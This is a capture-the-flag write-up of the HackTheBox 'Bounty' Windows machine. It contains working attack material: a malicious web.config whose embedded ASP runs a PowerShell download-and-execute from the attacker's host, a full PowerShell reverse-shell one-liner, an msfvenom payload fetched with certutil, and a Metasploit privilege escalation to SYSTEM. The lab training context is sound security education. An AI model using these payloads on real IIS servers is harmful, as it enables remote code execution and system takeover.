---
title: "HackTheBox Writeup: Bounty"
date: 2019-08-31T05:34:26+02:00
toc: true
showdate: true
tags:
  - hackthebox
  - ctf
  - writeup
---

Bounty requires to gain initial foothold with an interesting method I had never seen before, taking advantage of one of ASP.NET's own features to gain RCE. After that, getting root is very straightforward and multiple local exploits can be used to escalate privileges. It still stands as an interesting Windows box, one of those ideal ones for getting started in the world of Windows hacking.

![img](/images/bounty-writeup/1.png)

---

## Enumeration

The only result we get from a basic nmap scan is an IIS 7.5 web server running on port 80:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $sudo nmap -sV -sC -oA nmap 10.10.10.93
[sudo] password di baud:
Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-31 05:36 CEST
Nmap scan report for 10.10.10.93
Host is up (0.025s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.74 seconds
```

The version of IIS tells us the OS on the box can be either Windows 7 or Windows Server 2008 R2. The web server doesn't seem to contain anything interesting either, we only have a picture called merlin.jpg which I have examined with exiftools and other steganography tools with no success, it isn't hiding anything:

![img](/images/bounty-writeup/2.png)

Running a dirb scan with the default common.txt dictionary reveals a few folders that look useful, including one for uploaded files, however no files are found inside them (not with this relatively small dictionary at least):

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $dirb http://10.10.10.93/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 31 05:38:10 2019
URL_BASE: http://10.10.10.93/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.93/ ----
==> DIRECTORY: http://10.10.10.93/aspnet_client/                                                       
==> DIRECTORY: http://10.10.10.93/uploadedfiles/                                                       

---- Entering directory: http://10.10.10.93/aspnet_client/ ----
==> DIRECTORY: http://10.10.10.93/aspnet_client/system_web/                                            

---- Entering directory: http://10.10.10.93/uploadedfiles/ ----

---- Entering directory: http://10.10.10.93/aspnet_client/system_web/ ----

-----------------
END_TIME: Sat Aug 31 05:46:26 2019
DOWNLOADED: 18448 - FOUND: 0
```

By default dirb doesn't append file extensions to the URLs it generates from the dictionary, so it would only find .html and .php files with this command, and it looks like there aren't any ones on the server, not with easily guessable names at least. But because one of the folders is called /aspnet_client/ we may have a few chances to find .asp and/or .aspx files on the server, so let's run another scan specifying those file extensions this time:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $dirb http://10.10.10.93/ -r -X .aspx,.asp

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Aug 31 05:48:48 2019
URL_BASE: http://10.10.10.93/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Not Recursive
EXTENSIONS_LIST: (.aspx,.asp) | (.aspx)(.asp) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.93/ ----
+ http://10.10.10.93/transfer.aspx (CODE:200|SIZE:974)                                                 

-----------------
END_TIME: Sat Aug 31 05:52:57 2019
DOWNLOADED: 9224 - FOUND: 1
```

In fact we found a file called transfer.aspx:

![img](/images/bounty-writeup/3.png)

It's a simple ASP application that lets us upload files on the server, however the allowed extensions a file can have in order to be uploaded are white listed, so we must find an appropriate file extension that the application accepts and that at the same time can be of some practical use to us. We can get a list of file types supported by IIS and ASP applications in general from Microsoft's website and try those: https://docs.microsoft.com/en-us/previous-versions/2wawkw1c(v=vs.140)

After a few tries we discover .config files are allowed to be uploaded on the server, and after googling a bit it's possible to discover that web.config files can be used to inject ASP code: https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/

---

## Exploitation: gaining RCE with web.config upload

web.config files dictate several rules regarding how the website should behave, if they are present in a specific folder they will only affect said folder, but their effect takes place on the entire website if a web.config file is present in the web root. This is an example of web.config file taken from the blog post linked above, edited to download and executed a PowerShell script from our local box:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.webServer>
<handlers accessPolicy="Read, Script, Write">
<add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
</handlers>
<security>
<requestFiltering>
<fileExtensions>
<remove fileExtension=".config" />
</fileExtensions>
<hiddenSegments>
<remove segment="web.config" />
</hiddenSegments>
</requestFiltering>
</security>
</system.webServer>
</configuration>
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.37:9090/ps_shell.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

The actual command executed by PowerShell is this:

```powershell
IEX (New-Object Net.WebClient).downloadString('http://10.10.14.67:9090/ps_shell.ps1')
```

It creates a WebClient object and uses its downloadString function to grab a PowerShell script hosted on the web server we are hosting locally to execute it straight away. That script we are going to feed PowerShell is a simple reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.37",9292);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

We can now start our web server:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $php -S 0.0.0.0:9090
PHP 7.3.4-2 Development Server started at Sat Aug 31 05:58:33 2019
Listening on http://0.0.0.0:9090
Document root is /home/baud/bounty
Press Ctrl-C to quit.
```

Then upload the web.config file and navigate to it from http://10.10.10.93/uploadedfiles/web.config and we will receive a connection from the box, giving us a reverse shell as Merlin:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $nc -lvnp 9292
listening on [any] 9292 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.10.93] 49158

PS C:\windows\system32\inetsrv> whoami
bounty\merlin
PS C:\windows\system32\inetsrv>
```

We can read the user.txt flag from this user, but it won't appear at first because the author made it a hidden file, but we can still see it by appending the -Force option to *dir*:

```shell-session
PS C:\users\merlin\desktop> dir
PS C:\users\merlin\desktop> dir -Force


Directory: C:\users\merlin\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a-hs         5/30/2018  12:22 AM        282 desktop.ini                       
-a-h-         5/30/2018  11:32 PM         32 user.txt
```

It's time for some basic local enumeration. Running *systeminfo* should always be one of the first steps when in a Windows box, it's going to give us a lot of useful information, what we should especially interested in are the hotfixes, from those we can determine whether or not the system is up to date or not, and if it isn't it's most likely going to be vulnerable to know local privilege escalation exploits:

```shell-session
PS C:\users\merlin\desktop> systeminfo

Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          8/31/2019, 4:30:42 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
[01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,583 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,591 MB
Virtual Memory: In Use:    504 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
[01]: Intel(R) PRO/1000 MT Network Connection
Connection Name: Local Area Connection
DHCP Enabled:    No
IP address(es)
[01]: 10.10.10.93
```

No hotfixes installed, so we can try running Metasploit's local exploit suggester to find privilege escalation vulnerabilities to take advantage of.

---

## From PowerShell to Meterpreter

First we must spawn a Meterpreter session so we create a Meterpreter payload with msfvenom:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.37 LPORT=9999 -f exe -o baudy.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of exe file: 73802 bytes
Saved as: baudy.exe
```

Then start a multi handler from msfconsole:

```shell-session
┌─[baud@parrot]─[~/bounty]
└──╼ $msfconsole
[-] ***rTing the Metasploit Framework console...|
[-] * WARNING: No database support: No database YAML file
[-] ***

_                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
|/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


=[ metasploit v5.0.24-dev                          ]
+ -- --=[ 1894 exploits - 1068 auxiliary - 329 post       ]
+ -- --=[ 547 payloads - 44 encoders - 10 nops            ]
+ -- --=[ 2 evasion                                       ]

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 10.10.14.37
lhost => 10.10.14.37
msf5 exploit(multi/handler) > set lport 9999
lport => 9999
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.37:9999
```

In order to download the payload on the box I resorted to certutil.exe, my usual method is using the Invoke-WebRequest PowerShell cmdlet but this version of Windows does not support it. Still, downloading files with certutil is very easy:

```shell-session
PS C:\users\merlin\desktop> certutil -urlcache -f http://10.10.14.37:9090/baudy.exe baudy.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
PS C:\users\merlin\desktop> dir


Directory: C:\users\merlin\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         8/31/2019   5:21 AM      73802 baudy.exe
```

Run the payload:

```shell-session
PS C:\users\merlin\desktop> .\baudy.exe
```

And we receive a Meterpreter session:

```shell-session
[*] Meterpreter session 1 opened (10.10.14.37:9999 -> 10.10.10.93:49161) at 2019-08-31 06:25:17 +0200

meterpreter > getuid
Server username: BOUNTY\merlin
meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

From the Meterpreter shell we can run the local_exploit_suggester module in the current session:

```shell-session
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.93 - Collecting local exploits for x86/windows...
[*] 10.10.10.93 - 29 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```

It has to be said that the output of *sysinfo* above told us we are running on a 64 bits machine, but on a 32 bits process. This mismatch can cause the output of local_exploit_suggester to be inaccurate, so just to make sure we didn't get false positives we can migrate to a 64 bits process and re-run the module:

```shell-session
meterpreter > ps

Process List
============

PID   PPID  Name                     Arch  Session  User           Path
---   ----  ----                     ----  -------  ----           ----
0     0     [System Process]                                       
4     0     System                                                 
224   4     smss.exe                                               
256   460   svchost.exe                                            
308   292   csrss.exe                                              
360   352   csrss.exe                                              
368   292   wininit.exe                                            
404   352   winlogon.exe                                           
460   368   services.exe                                           
476   368   lsass.exe                                              
484   368   lsm.exe                                                
572   460   svchost.exe                                            
628   460   vmacthlp.exe                                           
672   460   svchost.exe                                            
744   460   svchost.exe                                            
748   404   LogonUI.exe                                            
764   460   svchost.exe                                            
800   460   svchost.exe                                            
856   460   svchost.exe                                            
900   460   svchost.exe                                            
920   460   spoolsv.exe                                            
940   460   svchost.exe                                            
1060  460   svchost.exe                                            
1120  460   VGAuthService.exe                                      
1220  460   vmtoolsd.exe                                           
1244  460   ManagementAgentHost.exe                                
1268  460   svchost.exe                                            
1420  460   sppsvc.exe                                             
1456  800   taskeng.exe                                            
1716  1852  powershell.exe           x64   0        BOUNTY\merlin  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
1724  572   WmiPrvSE.exe                                           
1736  1716  baudy.exe                x86   0        BOUNTY\merlin  C:\users\merlin\desktop\baudy.exe
1796  460   dllhost.exe                                            
1836  308   conhost.exe              x64   0        BOUNTY\merlin  C:\Windows\System32\conhost.exe
1852  2016  cmd.exe                  x64   0                       C:\Windows\System32\cmd.exe
1924  460   msdtc.exe                                              
2016  1268  w3wp.exe                 x64   0        BOUNTY\merlin  C:\Windows\System32\inetsrv\w3wp.exe

meterpreter >
```

There are only four x64 processes running, only three of which are running as Merlin. I chose PowerShell as my target process and it worked, switching from a 32 bits to a 64 bits proecess:

```shell-session
meterpreter > migrate 1716
[*] Migrating from 1736 to 1716...
[*] Migration completed successfully.
meterpreter > sysinfo
Computer        : BOUNTY
OS              : Windows 2008 R2 (Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter >
```

Now re-run the module and indeed the results are less and different, much more accurate than before:

```shell-session
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.93 - Collecting local exploits for x64/windows...
[*] 10.10.10.93 - 11 exploit checks are being tried...
[+] 10.10.10.93 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.93 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
meterpreter >
```

---

## Privilege escalation: ms10-092-schelevator

The *schelevator* exploit is one of the few you might have used yourself a few times before because it often pops up in boxes like this, with no hotfixes installed, and it does work pretty much every time so I'm going to use that one. Background the Meterpreter session with Ctrl + Z and load the module, set the right session (and the right local IP for the new session, the default value might not be correct) and launch it to escalate privileges to SYSTEM:

```shell-session
meterpreter >
Background session 1? [y/N]  
msf5 exploit(multi/handler) > use exploit/windows/local/ms10_092_schelevator
msf5 exploit(windows/local/ms10_092_schelevator) > set session 1
session => 1
msf5 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.37
lhost => 10.10.14.37
msf5 exploit(windows/local/ms10_092_schelevator) > run

[*] Started reverse TCP handler on 10.10.14.37:4444
[*] Preparing payload at C:\Windows\TEMP\KWqxWolSg.exe
[*] Creating task: aizD0U6pSFHWlWB
[*] SUCCESS: The scheduled task "aizD0U6pSFHWlWB" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\aizD0U6pSFHWlWB...
[*] Original CRC32: 0xee8eae6
[*] Final CRC32: 0xee8eae6
[*] Writing our modified content back...
[*] Validating task: aizD0U6pSFHWlWB
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status         
[*] ======================================== ====================== ===============
[*] aizD0U6pSFHWlWB                          9/1/2019 5:47:00 AM    Ready          
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "aizD0U6pSFHWlWB" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "aizD0U6pSFHWlWB" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (179779 bytes) to 10.10.10.93
[*] SUCCESS: Attempted to run the scheduled task "aizD0U6pSFHWlWB".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.37:4444 -> 10.10.10.93:49163) at 2019-08-31 06:48:23 +0200
[*] SUCCESS: The scheduled task "aizD0U6pSFHWlWB" was successfully deleted.
[*] SCHELEVATOR

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

We are SYSTEM and can grab the root.txt flag from Administrator's desktop:

![img](/images/bounty-writeup/4.png)

